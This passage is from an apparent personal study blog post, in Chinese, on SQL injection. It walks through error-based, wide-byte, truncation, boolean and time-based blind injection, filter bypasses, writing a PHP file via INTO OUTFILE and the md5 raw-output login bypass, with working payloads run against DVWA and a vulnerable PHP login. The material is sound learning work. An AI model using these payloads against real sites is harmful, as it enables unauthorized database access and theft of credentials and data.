+<p>② into outfile 写文件操作<br>MySQL 提供了向磁盘写文件的操作，与 load_file() 一样，必须有 FILE 权限，并且文件必须为全路径名称。</p>
+<p>写入文件：<br>SELECT ‘<?php phpinfo();?>‘ into oufile ‘C:\wwwroot\1.php’</p>
+<p>③ 连接字符串<br>MySQL 如果需要一次查询多个数据，可以使用 concat() 或 concat_ws() 函数来完成。concat(str1, str2,…)</p>
+<h2 id="0x03-函数"><a href="#0x03-函数" class="headerlink" title="0x03 函数"></a>0x03 函数</h2><p><strong>group_concat()函数</strong></p>
+<p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
+<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
+<p>SELECT name FROM student WHERE id = 1 UNION SELECT concat(user(), ‘,’, database(), ‘,’, version());</p>
+<p>也可以将逗号改用十六进制表示：0x2c</p>
+<p><strong>区别</strong></p>
+<p>1.CONCAT()　　拼接单行字符串</p>
+<p>select concat(‘100’，user_id) from table1;</p>
+<p>select concat(‘11‘,‘22‘,‘33‘);</p>
+<p>结果　　112233</p>
+<p>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</p>
+<p>select concat(‘11‘,‘22‘,null);</p>
+<p>结果 NULL</p>
+<p>2.GROUP_CANCAT()把查询出的所有行的字符串拼接成一个串 返回</p>
+<p>例如：我用select dictinct date from table1,得到如下表</p>
+<p>200805</p>
+<p>200806</p>
+<p>200807</p>
+<p>200808</p>
+<p>200809</p>
+<p>200810</p>
+<p>200811</p>
+<p>现在我需要将得到的这个表的这一列拼接成一个字符串，即</p>
+<p>200805，200806，200807，200808，200809，200810，200811</p>
+<p>select GROUP_CONCAT(dictinct date) from table1;</p>
+<p>select GROUP_CONCAT(dictinct ‘001-’， date) from table1; 拼接字符串 并返回不同的</p>
+<p>返回 001-200805，001-200806，001-200807，001-200808，001-200809，001-200810，001-200811</p>
+<h3 id="MySQL-显错式注入，使用错误提取消息"><a href="#MySQL-显错式注入，使用错误提取消息" class="headerlink" title="MySQL 显错式注入，使用错误提取消息"></a><strong>MySQL 显错式注入</strong>，使用错误提取消息</h3><p>① 通过 updatexml 函数执行 SQL 语句</p>
+<p>首先了解下updatexml()函数：<br>updatexml (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串) ，<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>SELECT * FROM message WHERE id = 1 and updatexml(1, (concat(0x7c, (SELECT @@version))), 1)<strong>注意id=正确值</strong><br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，报错，会显示出无法识别的内容：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/2019022422162974.png" alt="在这里插入图片描述"></p>
+<p>② 通过 extractvalue函数<br>SEELCT * FROM message WHERE id= 1 AND extractvalue(1, concat(0x7c, (SELECT user())))<br>同样报错显示出当前用户<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224222331730.png" alt="在这里插入图片描述"></p>
+<p><strong>记得注释后面的内容</strong></p>
+<p><strong>sql server 显错式注入</strong></p>
+<p><strong>① 枚举当前表或者列</strong><br> 假设选择存在这样一张表：</p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224191228560.png" alt="在这里插入图片描述"></p>
+<p>查询 root 用户的详细信息，SQL 语句猜测如下：<br>SELECT * FROM user WHERE username = ‘root’ AND password = ‘root’</p>
+<p>攻击者可以利用 SQL Server 特性来获取敏感信息，在输入框中输入如下语句：<br>‘ having 1 = 1 –<br>最终执行的 SQL 语句就会变为：<br>SELECT * FROM user WHERE username = ‘root’ AND password = ‘root’ HAVING 1 = 1 –</p>
+<p>那么 SQL 的执行器可能会抛出一个错误：<br><img src="https://img-blog.csdnimg.cn/20190224191512414.png" alt="在这里插入图片描述"></p>
+<p>攻击者就可以发现当前的表名为 user、而且存在字段 id。</p>
+<p>攻击者可以利用此特性继续得到其他列名，输入如下语句：<br>‘ GROUP BY users.id HAVING 1 = 1 –<br>则 SQL 语句变为：<br>SELECT * FROM user WHERE username = ‘root’ AND password = ‘root’ GROUP BY users.id HAVING 1 = 1 –</p>
+<p>抛出错误：</p>
+<p>由此可以看到包含列名 username。可以一次递归查询，知道没有错误消息返回位置，这样就可以利用 HAVING 字句得到当表的所有列名。<br>注：Select指定的每一列都应该出现在Group By子句中，除非对这一列使用了聚合函数</p>
+<p>②. 利用数据类型错误提取数据<br>如果试图将一个字符串与非字符串比较，或者将一个字符串转换为另一个不兼容的类型，那么SQL 编辑器将会抛出异常。</p>
+<p>如下列 SQL 语句：<br>SELECT * FROM user WHERE username = ‘abc’ AND password = ‘abc’ AND 1 &gt; (SELECT TOP 1 username FROM users)</p>
+<p>执行器错误提示：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224193113204.png" alt="在这里插入图片描述"><br>这就可以获取到用户的用户名为 root。因为在子查询 SELECT TOP 1 username FROM users 中，将查询到的用户名的第一个返回，返回类型是 varchar 类型，然后要跟 int 类型的 1 比较，两种类型不同的数据无法比较而报错，从而导致了数据泄露。</p>
+<p>利用此方法可以递归推导出所有的账户信息：<br>SELECT * FROM users WHERE username = ‘abc’ AND password = ‘abc’ AND 1 &gt; (SELECT TOP 1 username FROM users WHERE not in (‘root’))。<br>通过构造此语句就可以获得下一个 用户名；若把子查询中的 username 换成其他列名，则可以获取其他列的信息</p>
+<h2 id="0x04宽字节注入"><a href="#0x04宽字节注入" class="headerlink" title="0x04宽字节注入"></a>0x04宽字节注入</h2><p>宽字节注入是由编码不统一所造成的，这种注入一般出现在 PHP + MySQL中。</p>
+<p>在 PHP 配置文件 php.ini 中存在 magic_quotes_gpc 选项，被称为魔术引号，当此选项被打开时，使用 GET、POST、Cookie 所接受的 单引号(’)、双引号(“)、反斜线() 和 NULL 字符都会自动加上一个反斜线转义。</p>
+<p>如下使用 PHP 代码使用 $_GET 接收参数：<img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224223136534.png" alt="在这里插入图片描述"></p>
+<p>如访问URL：<code>http:/www.xxser.com/Get.php?id=&#39;</code>，显示如下：<img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224223317122.png" alt="在这里插入图片描述"></p>
+<p>单引号<code>&#39;</code>被转义后就变成了<code>\&#39;</code>，在 MySQL 中，<code>\&#39;</code>是一个合法的字符，也就没办法闭合单引号，所以，注入类型是字符型时无法构成注入。</p>
+<p>但是若是输入：<code>%d5&#39;</code>，访问URL：<code>http:/www.xxser.com/Get.php?id=%d5&#39;</code>，显示如下：<img src="https://img-blog.csdnimg.cn/2019022422340713.png" alt="在这里插入图片描述"></p>
+<p>可以发现，这次单引号没有被转义，这样就可以突破 PHP 转义，继续闭合 SQL 语句进行 SQL 注入。</p>
+<h2 id="0x05-MySQL-长字符截断"><a href="#0x05-MySQL-长字符截断" class="headerlink" title="0x05. MySQL 长字符截断"></a>0x05. MySQL 长字符截断</h2><p>在 MySQL 中的一个设置里有一个 sql_mode 选项，当 sql_mode 设置为 default 时，即没有开启 STRICT——ALL_TABLES 选项时，MySQL 对插入超长的值只会提示 waring，而不是 error。</p>
+<p>假设有一张表如下：<img src="https://img-blog.csdnimg.cn/20190224223849184.png" alt="在这里插入图片描述"></p>
+<p>username 字段的长度为 7。</p>
+<p>分别插入一下 SQL 语句：<br> ① 插入正常 SQL 语句：<br> <code>INSERT users(id, username, password) VALUES(1, &#39;admin&#39;, &#39;admin&#39;);</code></p>
+<p>成功插入</p>
+<p>② 插入错误的 SQL 语句，使 username 字段的长度超过7：<br> <code>INSERT users(id, username, password) VALUES(2, &#39;admin &#39;, &#39;admin&#39;);</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20190224224213520.png" alt="在这里插入图片描述"></p>
+<p>虽然有警告，但是成功插入了。</p>
+<p>③ 再尝试插入一条错误的 SQL 语句，长度同一超过原有的规定长度：<br> <code>INSERT users(id, username, password) VALUES(3, &#39;admin x), &#39;admin;</code><br> <img src="https://img-blog.csdnimg.cn/20190224224328555.png" alt="在这里插入图片描述"></p>
+<p>查询数据库：<img src="https://img-blog.csdnimg.cn/20190224224351430.png" alt="在这里插入图片描述"></p>
+<p>可以看到，三条数据都被插入到数据库中，但是值发生了变化。在默认情况下，如果数据超出默认长度，MySQL 会将其截断。</p>
+<p>但是这样怎么攻击呢？通过查询用户名为 admin 的用户：</p>
+<p><img src="https://img-blog.csdnimg.cn/20190224224526351.png" alt="在这里插入图片描述"></p>
+<p>可以发现，只查询用户名为 admin 的用户，但是另外两个长度不一致的 admin 用户也被查询出，这样就会造成一些安全问题。</p>
+<p>比如有一处管理员登录时这样判断的：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="built_in">count</span>(*) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">&#x27;***&#x27;</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么攻击者只需要注册一个长度超过规定长度的用户名“admin ”即可轻易进入后台管理页面。</p>
+<h2 id="0x06-延时注入"><a href="#0x06-延时注入" class="headerlink" title="0x06 延时注入"></a>0x06 延时注入</h2><p>延时注入属于盲注技术的一种，是一种基于时间差异的注入技术。下面以 MySQL 为例介绍延时注入。</p>
+<p>在 MySQL 中有一个函数：sleep(duration)，这个函数意思是在 duration 参数给定数秒后运行语句，如下 SQL 语句：<br> <code>SELECT * FROM users WHERE id = 1 AND sleep(3)</code><br> 就是将在 3 秒后执行该 SQL 语句。</p>
+<p><strong>可以使用这个函数来判断 URL 是否存在 SQL 注入漏洞</strong>，步骤如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/20190224225212438.png" alt="在这里插入图片描述"></p>
+<p>通过页面返回的世界可以断定，DBMS 执行了 <code>and sleep(3)</code> 语句，这样一来就可以判断出 URL 存在 SQL 注入漏洞。</p>
+<p>然后通过 sleep() 函数还可以读出数据，但需要其他函数的配合，步骤如下：</p>
+<p>①查询当前用户，并取得字符串长度<br>执行SQL 语句：<br>AND if(length(user()) = 0, sleep(3), 1)<br>如果出现 3 秒延时，就可以判断出 user 字符串长度，注入时通常会采用折半算法减少判断。</p>
+<p>② 截取字符串第一个字符，并转换为 ASCII 码<br>AND if(hex(mid(user(), 1, 1)) = 1, sleep(3), 1)<br>AND if(hex(mid(user(), 1, 1)) = 2, sleep(3), 1)<br>……<br>不断更换 ASCII 码直到出现延时 3 秒就可以猜测出第一个字符。</p>
+<p>③ 递归截取字符串每一个字符，分别于 ASCII 码比较<br>AND if(hex(mid(user(), L, 1)) = N, sleep(3), 1)<br>注：L 的位置代表字符串的第几个字符，N 的位置代表 ASCII 码。</p>
+<p>不仅在 MySQL 中存在延时函数，在 SQL Server、Oracle 等数据库中也都存在类似功能的函数，如 SQL Server 的 waitfor delay、Oracle 中的 DBMS_LOCK.SLEEP 等函数。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">MID(<span class="params">column_name</span>,<span class="params">start</span>[,<span class="params">length</span>])</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>column_name</td>
+<td>必需。要提取字符的字段。</td>
+</tr>
+<tr>
+<td>start</td>
+<td>必需。规定开始位置（起始值是 1）。</td>
+</tr>
+<tr>
+<td>length</td>
+<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
+</tr>
+</tbody></table>
+<h2 id="0x07基于bool的盲注"><a href="#0x07基于bool的盲注" class="headerlink" title="0x07基于bool的盲注"></a><strong>0x07基于bool的盲注</strong></h2><p>盲注适合页面不显示任何数据查询结果，基于bool的盲注就是页面只有正常和不正常两种情况，通过true和false来猜解数据，速度比较慢，基于bool的盲注通常用函数length()，返回长度，ascii()，返回ASCII值，substr(string,a,b)，返回string以a开头，长度为b的字符串，count()，返回数量。ord()函数可以返回单个字符的ASCII码<br>char()函数可将ASCII码转换为对应的字符</p>
+<h4 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1 判断注入点"></a>1 判断注入点</h4><p>这里就不能像联合查询注入一样根据页面是否报错判断了，因为sql执行失败和未查到数据都会返回False，所以只能通过返回的逻辑值来判断</p>
+<p>根据payload返回的成功或失败可以判断是否存在注入点，</p>
+<p>如果带入user1返回为存在（真），那么当存在整型注入时，通过逻辑运算and（与）的关系，后面跟上1=1（恒真），那么返回值也肯定为存在（真），带入1=2（恒假）时，那么返回值也肯定为不存在（假）</p>
+<p>通过这种方式就可以判断是否存在布尔型盲注</p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/638" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9144690-61931af2bff33033.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/669" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9144690-ad2ec2eb515ed27e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/665" alt="img"></p>
+<h4 id="2读数据"><a href="#2读数据" class="headerlink" title="2读数据"></a>2读数据</h4><p>输入1’:</p>
+<p>输入1’#：</p>
+<p>为字符型bool盲注</p>
+<p>构造语句猜测当前数据库名长度是否大于5：1’ and length(database())&gt;5#，如图：</p>
+<p>说明当前数据库长度是小于5 的用二分法继续构造：1’ and length(database())&gt;3#；</p>
+<p>显然长度大于3却不大于5，当前数据库名长度就是4，</p>
+<p>然后判断数据库名第一个字符ASCII是否大于97：1’and (ascii(substr(database(),1,1)))&gt;97#，依旧使用二分法慢慢判断，最终确定为ASCII为100，对应字符为：d；（<strong>注：database()：会返回当前数据库名称</strong>）</p>
+<p>然后判断数据库名第二个字符ASCII是否大于97：1’and (ascii(substr(database(),2,1)))&gt;97#，最终确定ASCII为118，对应字符：v，同上步骤继续，最终确定当前数据库为：dvwa；</p>
+<p>然后判断当前数据库中<strong>数据表的个数</strong>：1’and (select count(*) from information_schema.tables where table_schema=database())&gt;3#,这个步骤可以有也可以没有，看完下面就知道了；</p>
+<p>然后判断当前数据库中第一个数据表的长度是否大于5：1’and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5#，结果如图：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/70" alt="img"></p>
+<p>limit子句用于限制查询结果返回的数量。</p>
+<p><strong>用法</strong>：【select * from tableName limit i,n 】</p>
+<p>参数：</p>
+<ul>
+<li>tableName : 为数据表；</li>
+<li>i : 为查询结果的索引值（默认从0开始）；</li>
+<li>n : 为查询结果返回的数量</li>
+</ul>
+<p>原理同上面判断数据库长度，最后得到当前数据库的第一个数据表名的长度，获取第二个表的长度：1’and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)&gt;5#，第三个，第四个以此类推，当第N个数据表长度大于0返回为假时，说明这个数据表不存在；</p>
+<p>然后猜解当前数据库的第一个数据表的第一个字符的ASCII：1’and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97#，结果为103，对应字符：g；</p>
+<p>然后猜解当前数据库的第一个数据表的第二个字符的ASCII：1’and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)))&gt;97#，结果为117，对应字符：u，</p>
+<p>第三个，第四个字符以此类推直到猜解完毕；</p>
+<p>然后猜解当前数据库中数据表users的列数：1’and (select count(*) from information_schema.columns where table_schema=database() and table_name=’users’)&gt;3#，同样，这个步骤也是可以省略的；</p>
+<p>然后猜解当前数据库中数据表users的第一列的长度：1’and (select length(column_name) from information_schema.columns where table_name=’users’ limit 0,1)&gt;5#，当大于0为假，说明此列不存在；</p>
+<p>然后猜解当前数据库数据表users的第一列字段的第一个字符：1’and (ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1)))&gt;97#，然后依次猜解完全部字段。</p>
+<h4 id="3常用函数"><a href="#3常用函数" class="headerlink" title="3常用函数"></a>3常用函数</h4><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163516499.png" alt="image-20220308163516499"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163726592.png" alt="image-20220308163726592"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163823741.png" alt="image-20220308163823741"></p>
+<h2 id="0x08-基于时间的盲注"><a href="#0x08-基于时间的盲注" class="headerlink" title="0x08.基于时间的盲注"></a>0x08.基于时间的盲注</h2><p>基于时间的盲注和基于bool的盲注很相似，只不过基于时间的盲注用于不管执行的SQL语句正确与否，页面都不会给任何提示，因此无法使用bool盲注。基于时间的盲注经常用到的函数除了上面的还有延时函数sleep()，benchmark()  ,    if(c,a,b)，如果c为真执行a，否则执行b。</p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164044032.png" alt="image-20220308164044032"></p>
+<p>猜解当前数据库名的长度，如果长度大于0就会延时5s：1’and if(length(database())&gt;0,sleep(5),0)#，如图：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/70" alt="img"></p>
+<p>然后猜解当前数据库中数据表的个数：1’and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(3),0)#；</p>
+<p>然后猜解当前数据库中的第一个数据表的第一个字符的ASCII：1’and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97,sleep(3),0)#，同bool注入的步骤一样，只是注入语句有点差异，类比上面的语句即可猜解数所有数据。</p>
+<h2 id="0x09-报错注入"><a href="#0x09-报错注入" class="headerlink" title="0x09 报错注入"></a>0x09 报错注入</h2><h3 id="floor："><a href="#floor：" class="headerlink" title="floor："></a>floor：</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163043347.png" alt="image-20220308163043347"></p>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml:"></a>updatexml:</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163120840.png" alt="image-20220308163120840"></p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>kobe’ and extractvalue(0,concat(0x7e,database())) #</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp():"></a>exp():</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308163207104.png" alt="image-20220308163207104"></p>
+<p>?id=1’ and exp(~(select * from (select user())x))%23</p>
+<h2 id="0x10-二次注入"><a href="#0x10-二次注入" class="headerlink" title="0x10 二次注入"></a>0x10 二次注入</h2><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164314139.png" alt="image-20220308164314139"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164347248.png" alt="image-20220308164347248"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164404811.png" alt="image-20220308164404811"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164651871.png" alt="image-20220308164651871"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164807879.png" alt="image-20220308164807879"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164836850.png" alt="image-20220308164836850"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308164851469.png" alt="image-20220308164851469"></p>
+<h2 id="0x11-绕过"><a href="#0x11-绕过" class="headerlink" title="0x11 绕过"></a>0x11 绕过</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165044761.png" alt="image-20220308165044761"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165125478.png" alt="image-20220308165125478"></p>
+<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165233684.png" alt="image-20220308165233684"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165407344.png" alt="image-20220308165407344"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165421680.png" alt="image-20220308165421680"></p>
+<p>%0c也可以绕过</p>
+<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165708693.png" alt="image-20220308165708693"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165728547.png" alt="image-20220308165728547"></p>
+<h2 id="0x12-sql读写文件"><a href="#0x12-sql读写文件" class="headerlink" title="0x12 sql读写文件"></a>0x12 sql读写文件</h2><p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165829448.png" alt="image-20220308165829448"></p>
+<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220308165917864.png" alt="image-20220308165917864"></p>
+<h2 id="0x13-md5-str-true-类型绕过"><a href="#0x13-md5-str-true-类型绕过" class="headerlink" title="0x13 md5($str,true)类型绕过"></a>0x13 md5($str,true)类型绕过</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">md5</span><span class="params">(string,raw)</span></span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要计算的字符串。</td>
+</tr>
+<tr>
+<td><em>raw</em></td>
+<td>可选。规定十六进制或二进制输出格式：  TRUE - 原始 16 字符二进制格式    FALSE - 默认。32 字符十六进制数</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>SELECT * FROM admin WHERE pass = ‘“.md5($password,true).”‘“;<br>将密码转换成16进制的hex值以后，再将其转换成字符串后包含’ ‘or ’ 6’</p>
+<p>SELECT * FROM admin WHERE pass=’ ‘or ’ 6’</p>
+<p>很明显可以注入了。</p>
+<p>难点就在如何寻找这样的字符串，网上有<br>提供两个字符串： ffifdyop、129581926211651571912466741651878684928<br>但题目有长度限制，所以输入ffifdyop即可获取flag</p>
+<p>再转成字符串:’ ’ ‘or’ 6</p>
+<p>解析:存在 or 即代码的两边有一边为真既可以绕过，其实为垃圾代码没有任何用的。</p>
+<p>or 后面有6，非零值即为真。既可以成功绕过。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/28/PHP%E7%89%B9%E6%80%A7/" rel="prev" title="PHP特性">
+                  <i class="fa fa-chevron-left"></i> PHP特性
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/08/XSS/" rel="next" title="XSS">
+                  XSS <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CJ</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">492k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">7:28</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
